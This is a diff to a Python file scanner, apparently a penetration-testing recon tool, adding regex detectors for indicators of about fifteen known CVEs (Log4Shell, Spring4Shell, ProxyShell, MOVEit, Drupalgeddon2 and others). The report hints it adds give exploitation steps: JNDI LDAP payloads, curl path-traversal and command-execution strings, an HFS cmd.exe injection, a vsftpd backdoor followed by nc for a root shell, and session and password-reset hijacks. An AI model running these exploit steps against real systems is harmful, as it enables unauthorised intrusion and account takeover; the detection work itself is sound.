@@ -507,6 +507,56 @@ _AD = [
     ("Consul ACL token", re.compile(
         r'(?i)\b(?:CONSUL_HTTP_TOKEN|consul_token|acl\.tokens\.\w+)\s*[:=]\s*["\']?'
         r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']?')),
+    # ---- iter-22: modern web exploit IOCs + service-banner CVEs (wwzwk72m3) ----
+    # Log4Shell JNDI injection - direct + obfuscated nested forms. Captures
+    # the literal `${jndi:` prefix (case-flex variants too).
+    ("Log4Shell JNDI", re.compile(
+        r'\$\{(?:\$?\{?(?:lower|upper|env|sys|date|jndi)[:}][^{}]*?)?'
+        r'jndi:(?:ldap|ldaps|rmi|dns|nis|iiop|corba|nds|http)s?://')),
+    # Spring4Shell (CVE-2022-22965) classLoader pipeline manipulation
+    ("Spring4Shell classLoader", re.compile(
+        r'class\.module\.classLoader\.resources\.context\.parent\.pipeline')),
+    # Confluence OGNL injection (CVE-2022-26134)
+    ("Confluence OGNL", re.compile(
+        r'\$\{\(#a=@org\.apache\.commons\.io\.IOUtils@toString')),
+    # ProxyShell autodiscover.json @-suffix SSRF (CVE-2021-34473)
+    ("ProxyShell autodiscover", re.compile(
+        r'/autodiscover/autodiscover\.json\?@[^/&\s]+(?:&|\?)Email=autodiscover')),
+    # ProxyLogon X-AnonResource-Backend SSRF (CVE-2021-26855)
+    ("ProxyLogon X-AnonResource", re.compile(
+        r'(?i)X-AnonResource-Backend\s*:\s*\S+/ecp/')),
+    # MOVEit human2.aspx webshell (CVE-2023-34362)
+    ("MOVEit human2.aspx", re.compile(
+        r'(?i)/human2\.aspx(?:\?|\s|HTTP)')),
+    # TeamCity ;.jsp auth-bypass (CVE-2024-27198)
+    ("TeamCity .jsp bypass", re.compile(
+        r'(?i)/app/rest/[^\s\'"]+;\.jsp')),
+    # NetScaler memory leak (CVE-2023-4966) NSC_AAAC cookie
+    ("NetScaler NSC_AAAC", re.compile(
+        r'\bNSC_AAAC\s*=\s*[A-Fa-f0-9]{60,}')),
+    # F5 BIG-IP iControl REST Connection-header auth bypass (CVE-2022-1388)
+    ("F5 BIG-IP iControl bypass", re.compile(
+        r'(?i)Connection\s*:\s*[^\r\n]*X-F5-Auth-Token[^\r\n]*\r?\n[^\r\n]*X-F5-Auth-Token\s*:\s*0\b')),
+    # GitLab pw-reset double-email (CVE-2023-7028) - array body marker
+    ("GitLab pw-reset double-email", re.compile(
+        r'user\[email\]\[\]\s*=\s*[^&\s]+@[^&\s]+&user\[email\]\[\]\s*=\s*')),
+    # ---- iter-22 service-banner CVE markers ----
+    # vsftpd 2.3.4 smiley backdoor (CVE-2011-2523) - distinctive banner in
+    # nmap -sV / ftp greeting captures.
+    ("vsftpd 2.3.4 backdoor", re.compile(
+        r'(?i)\b(?:220\s+\(?vsFTPd\s+|vsftpd\s+)2\.3\.4\b')),
+    # Samba 4.5.9+ SambaCry (CVE-2017-7494) - range 3.5.0-4.6.4 vulnerable
+    ("Samba SambaCry banner", re.compile(
+        r'(?i)Server\s*=\s*\[\s*Samba\s+(4\.[0-5]\.\d+|4\.6\.[0-4])[\.\-][\w.-]*\s*\]')),
+    # Apache 2.4.49 / 2.4.50 path traversal + RCE (CVE-2021-41773/42013)
+    ("Apache 2.4.49/50 traversal", re.compile(
+        r'(?i)\bApache/2\.4\.(49|50)\b')),
+    # HFS 2.3 RejettoHFS RCE (CVE-2014-6287)
+    ("HFS 2.3 RCE banner", re.compile(
+        r'(?i)\bHttpFileServer\s+2\.3[\w.-]*')),
+    # Drupalgeddon2 (CVE-2018-7600) - Drupal 7.x or 8.x version banner
+    ("Drupal pre-7.59/8.5.1", re.compile(
+        r'(?i)\bDrupal\s+(?:7\.(?:[0-9]|[1-5][0-9])|8\.[0-4](?:\.\d+)?|8\.5\.0)\b')),
     # ---- iter-21: Tier-2 from corpus mine wwzwk72m3 ----
     # GetUserSPNs default text-table recon row (TryHackMe Attacking Kerberos).
     # Header is: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon
@@ -2484,6 +2534,147 @@ def analyze(path, report, store=None):
                         hit = True
                         break
                     # GPP cpassword inline (32-byte AES-CBC blob)
+                    # ---- iter-22 dispatch branches ----
+                    if name == "Log4Shell JNDI":
+                        if filters.is_doc_file(path):
+                            continue
+                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
+                                   "Log4Shell JNDI injection (CVE-2021-44228)",
+                                   hint=("verify target: nslookup test.<unique>.dnslog.cn from victim; "
+                                         "manual PoC: ldap server (marshalsec) on attacker, "
+                                         "${jndi:ldap://<you>:1389/<class>}; OSCP+ legal as single-target"))
+                        hit = True
+                        break
+                    if name == "Spring4Shell classLoader":
+                        if filters.is_doc_file(path):
+                            continue
+                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
+                                   "Spring4Shell classLoader (CVE-2022-22965)",
+                                   hint=("POST body params class.module.classLoader.resources.context."
+                                         "parent.pipeline.first.pattern - manual exploit drops a JSP webshell "
+                                         "into the tomcat webroot; verify spring-webmvc + JDK9+"))
+                        hit = True
+                        break
+                    if name == "Confluence OGNL":
+                        if filters.is_doc_file(path):
+                            continue
+                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
+                                   "Confluence OGNL injection (CVE-2022-26134)",
+                                   hint=("curl <url>/'%24%7B(%23a%3D%40org.apache.commons.io.IOUtils%40"
+                                         "toString...)%7D/' - get the response body; pre-auth RCE"))
+                        hit = True
+                        break
+                    if name == "ProxyShell autodiscover":
+                        if filters.is_doc_file(path):
+                            continue
+                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
+                                   "ProxyShell autodiscover SSRF (CVE-2021-34473)",
+                                   hint=("autodiscover@-suffix bypass: SSRF chains to /powershell -> "
+                                         "New-MailboxExportRequest webshell drop; manual exploit only"))
+                        hit = True
+                        break
+                    if name == "ProxyLogon X-AnonResource":
+                        if filters.is_doc_file(path):
+                            continue
+                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
+                                   "ProxyLogon X-AnonResource-Backend (CVE-2021-26855)",
+                                   hint="Exchange SSRF -> /ecp + write-out CMD aspx webshell to %ProgramFiles%")
+                        hit = True
+                        break
+                    if name == "MOVEit human2.aspx":
+                        if filters.is_doc_file(path):
+                            continue
+                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
+                                   "MOVEit human2.aspx webshell (CVE-2023-34362)",
+                                   hint=("post-SQLi webshell drop in MOVEit wwwroot - if present, "
+                                         "the operator already has token-recovery; chain: GET /human2.aspx?... "
+                                         "with crafted Cookie:siLockProof header"))
+                        hit = True
+                        break
+                    if name == "TeamCity .jsp bypass":
+                        if filters.is_doc_file(path):
+                            continue
+                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
+                                   "TeamCity ;.jsp auth bypass (CVE-2024-27198)",
+                                   hint=("/app/rest/users/id:1/tokens/RPC2;.jsp - creates admin API token; "
+                                         "then POST /app/rest/users with admin role"))
+                        hit = True
+                        break
+                    if name == "NetScaler NSC_AAAC":
+                        if filters.is_doc_file(path):
+                            continue
+                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
+                                   "Captured NetScaler NSC_AAAC session cookie (CVE-2023-4966)",
+                                   hint=("inject Cookie: NSC_AAAC=<value> into NetScaler /logon/LogonPoint/index.html "
+                                         "for session hijack; if AAA enabled, this IS the admin session"))
+                        hit = True
+                        break
+                    if name == "F5 BIG-IP iControl bypass":
+                        if filters.is_doc_file(path):
+                            continue
+                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
+                                   "F5 BIG-IP iControl REST Connection-header bypass (CVE-2022-1388)",
+                                   hint=("POST /mgmt/tm/util/bash with X-F5-Auth-Token: 0; pre-auth RCE; "
+                                         "single-target OSCP+ legal"))
+                        hit = True
+                        break
+                    if name == "GitLab pw-reset double-email":
+                        if filters.is_doc_file(path):
+                            continue
+                        report.add("HIGH", "INTERESTING FILES", path, lineno,
+                                   "GitLab pw-reset double-email body (CVE-2023-7028)",
+                                   hint=("POST /users/password with body 'user[email][]=victim@x&user[email][]=attacker@y' "
+                                         "- victim's pw-reset link is delivered to BOTH addresses"))
+                        hit = True
+                        break
+                    if name == "vsftpd 2.3.4 backdoor":
+                        if filters.is_doc_file(path):
+                            continue
+                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
+                                   "vsftpd 2.3.4 smiley backdoor (CVE-2011-2523)",
+                                   hint=("login with username ending ':)' to trigger backdoor; "
+                                         "then nc <host> 6200 for root shell. Manual exploit; exam-legal"))
+                        hit = True
+                        break
+                    if name == "Samba SambaCry banner":
+                        if filters.is_doc_file(path):
+                            continue
+                        ver = am.group(1)
+                        report.add("HIGH", "RECON", path, lineno,
+                                   f"Samba {ver} - CVE-2017-7494 SambaCry (writable-share RCE)",
+                                   hint=("requires writable share + path disclosure; upload .so payload, "
+                                         "trigger via writeable named pipe; manual single-target"))
+                        hit = True
+                        break
+                    if name == "Apache 2.4.49/50 traversal":
+                        if filters.is_doc_file(path):
+                            continue
+                        report.add("HIGH", "RECON", path, lineno,
+                                   "Apache 2.4.49/50 (CVE-2021-41773/42013) path traversal -> RCE",
+                                   hint=("curl <url>/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd  - if mod_cgi "
+                                         "enabled: ' --data 'echo;id' /cgi-bin/.%2e/.../bin/sh '"))
+                        hit = True
+                        break
+                    if name == "HFS 2.3 RCE banner":
+                        if filters.is_doc_file(path):
+                            continue
+                        report.add("CRITICAL", "RECON", path, lineno,
+                                   "HFS 2.3 (CVE-2014-6287) macro RCE",
+                                   hint=("curl <url>/?search=%00{.exec|cmd.exe /c whoami.}  - macro injection "
+                                         "in search param; classic HTB Optimum primitive"))
+                        hit = True
+                        break
+                    if name == "Drupal pre-7.59/8.5.1":
+                        if filters.is_doc_file(path):
+                            continue
+                        ver = am.group(0)
+                        report.add("HIGH", "RECON", path, lineno,
+                                   f"{ver} - CVE-2018-7600 Drupalgeddon2",
+                                   hint=("POST /user/register?element_parents=account/mail/%23value with "
+                                         "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec; "
+                                         "manual single-target"))
+                        hit = True
+                        break
                     # ---- iter-21 dispatch branches ----
                     if name == "GetUserSPNs CSV row":
                         plow = path.lower()
